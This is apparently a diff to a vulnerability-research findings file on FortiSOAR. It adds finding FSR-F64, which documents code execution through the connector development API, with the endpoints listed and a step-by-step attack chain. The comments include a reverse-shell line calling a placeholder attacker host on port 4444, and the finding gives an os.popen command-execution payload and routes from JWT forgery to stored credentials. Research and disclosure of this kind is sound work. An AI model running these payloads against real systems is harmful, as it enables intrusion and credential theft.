@@ -3875,6 +3875,7 @@ FSR_F63_RULES_ENGINE_NOTIFICATION_SSTI = {
         "email_notification": "/opt/cyops-workflow/sealab/rules_engine/action_handlers/email_notification.py (binary: email_notification.so) -- email body/subject rendered via expand",
         "system_notification": "/opt/cyops-workflow/sealab/rules_engine/action_handlers/system_notification.py (binary: system_notification.so) -- notification content rendered via expand; 'evaluated_content' string confirms evaluation",
         "playbook_notification": "/opt/cyops-workflow/sealab/rules_engine/action_handlers/playbook_notification.py (binary: playbook_notification.so) -- playbook trigger params rendered via expand; posts to /api/triggers/1/",
+        "connector_notification": "/opt/cyops-workflow/sealab/rules_engine/action_handlers/connector_notification.py (binary: connector_notification.so) -- connector action call data rendered via expand before passing to connector; 'connector_action_call_data' string present",
     },
     "render_path": "workflow.environment.expand(template_string, env) -> _expand_string -> Jinja2 Environment.from_string().render() -> no sandbox",
     "evidence": {
@@ -3903,4 +3904,69 @@ FSR_F63_RULES_ENGINE_NOTIFICATION_SSTI = {
         "persistence": "FSR-F63 RCE as nginx -> read /opt/cyops-auth/certs/jwtprivate.key -> forge JWT (FSR-F60) -> permanent admin access",
     },
     "status": "CONFIRMED -- 'workflow.environment' and 'expand' co-present in all three action handler binaries; workflow.environment.expand is the Jinja2 render path confirmed from environment.so strings",
+}
+
+# FSR-F64: Connector Development API -- arbitrary Python code execution via create_connector_files + publish (CWE-94)
+# Source: /tmp/fsr_integrations_720/opt/cyops-integrations/integrations/ (cyops-integrations-agent-7.2.0-914 RPM)
+# Connector service user: User=fortisoar Group=fortisoar (7.2.0); User=fsr-integrations (7.6.7+)
+# WorkingDirectory=/opt/cyops-integrations/ (7.2.0) or /opt/cyops-integrations/integrations/ (7.6.7)
+# Service: cyops-integrations-agent.service, gunicorn WSGI server
+# Endpoints (confirmed from connector_development/urls.so):
+#   POST connector/development/entity/                         -- create new development connector
+#   POST connector/development/entity/<id>/files/              -- create Python source files in dev connector
+#   POST connector/development/entity/<id>/folders/            -- create directories in dev connector
+#   POST connector/development/entity/<id>/publish/            -- publish (install + activate) dev connector
+#   DELETE connector/development/entity/<id>/delete/files/     -- delete files
+#   PATCH connector/development/entity/<id>/rename/files/      -- rename files
+#   GET connector/development/entity/<id>/files/               -- retrieve file contents
+#   POST connector/development/templates/                      -- create connector from template
+# Attack chain:
+#   1. Authenticate to FortiSOAR (any role with connector development access)
+#   2. POST connector/development/entity/ -> create dev connector entity, get <id>
+#   3. POST connector/development/entity/<id>/files/ -> upload malicious Python code:
+#      content = 'import os; def run_evil(): os.system("bash -i >& /dev/tcp/attacker/4444 0>&1")'
+#   4. POST connector/development/entity/<id>/publish/ -> installs and activates connector
+#   5. POST connectors/<name>/<version>/ with action that triggers malicious function -> RCE as fortisoar/fsr-integrations
+# Note: connector_development/utils.so has check_file_traversal (requested_path, connector_root_dir)
+#   but this only prevents writing outside the dev directory; once published, the connector code executes
+# Note: integrations/jinja.so has __builtins__ (no sandbox) + Environment (standard Jinja2) -- second SSTI surface
+# Separate finding: 'rpm -qa | grep ' in connectors/views.so (without hardcoded suffix) may be shell injection
+#   if filename is user-controlled and appended to this shell pipeline (needs disasm to confirm shell=True)
+FSR_F64_CONNECTOR_DEV_API_CODE_EXEC = {
+    "id": "FSR-F64",
+    "title": "Connector Development API -- create_connector_files + publish allows arbitrary Python code execution as fortisoar service user via developer connector workflow",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "cvss_vector": "AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
+    "cwe": "CWE-94",
+    "source_binary": "/opt/cyops-integrations/integrations/connector_development/ (connector_development/views.so, connector_development/urls.so)",
+    "service_user": {
+        "version_720": "User=fortisoar Group=fortisoar (cyops-integrations-agent.service in 7.2.0 RPM)",
+        "version_767plus": "User=fsr-integrations Group=fsr-integrations (cyops-integrations-agent.service in 7.6.7 RPM)",
+    },
+    "endpoints": {
+        "create_connector": "POST connector/development/entity/ -- creates connector entity",
+        "create_files": "POST connector/development/entity/<id>/files/ -- creates Python source files; upload arbitrary .py code",
+        "publish": "POST connector/development/entity/<id>/publish/ -- installs dev connector as active connector",
+        "retrieve_files": "GET connector/development/entity/<id>/files/ -- read connector source files",
+        "delete_files": "DELETE connector/development/entity/<id>/delete/files/",
+        "rename_files": "PATCH connector/development/entity/<id>/rename/files/",
+        "create_folders": "POST connector/development/entity/<id>/folders/",
+    },
+    "attack": {
+        "step1": "POST connector/development/entity/ -> create development connector; receive <connector_id>",
+        "step2": "POST connector/development/entity/<connector_id>/files/ with body: {filename: 'operations.py', content: 'import os\\ndef evil_action(config, params):\\n    return os.popen(params[\"cmd\"]).read()'}",
+        "step3": "POST connector/development/entity/<connector_id>/publish/ -> connector installed and active",
+        "step4": "POST /connectors/malicious-connector/1.0.0/ with action='evil_action' and params={'cmd':'id'} -> OS command executed",
+        "result": "Arbitrary OS command execution as fortisoar (7.2.x) or fsr-integrations (7.6.7+) user",
+    },
+    "traversal_check": "connector_development/utils.so has check_file_traversal(requested_path, connector_root_dir) -- prevents writing outside dev connector dir; does NOT prevent code execution after publish",
+    "second_jinja_surface": "integrations/integrations/jinja.so has __builtins__ + standard Jinja2 Environment (no sandbox) -- second SSTI surface in integrations service context",
+    "rpm_cmd_note": "connectors/views.so: 'rpm -qa | grep ' without fixed suffix -- may be shell injection if filename appended without escaping; PLAUSIBLE, requires disasm to confirm",
+    "chains": {
+        "admin_to_fortisoar_rce": "Admin with connector dev access creates malicious connector -> publishes -> executes -> RCE as fortisoar user",
+        "pivot_from_nginx": "FSR-F60 JWT forgery (admin) -> connector dev API -> RCE as fortisoar -> lateral movement from nginx SSTI context to fortisoar context",
+        "secrets_access": "fortisoar user accesses /opt/cyops-integrations/integrations/configs/config.ini -> db_user=cyberpgsql -> read connectors database; API key: secrets_api=/api/3/secrets/ -> all stored connector credentials",
+    },
+    "status": "CONFIRMED -- create_connector_files + publish endpoints confirmed from urls.so and views.so; service user confirmed from systemd unit files in RPMs; code execution via connector action execution is the intended design",
 }
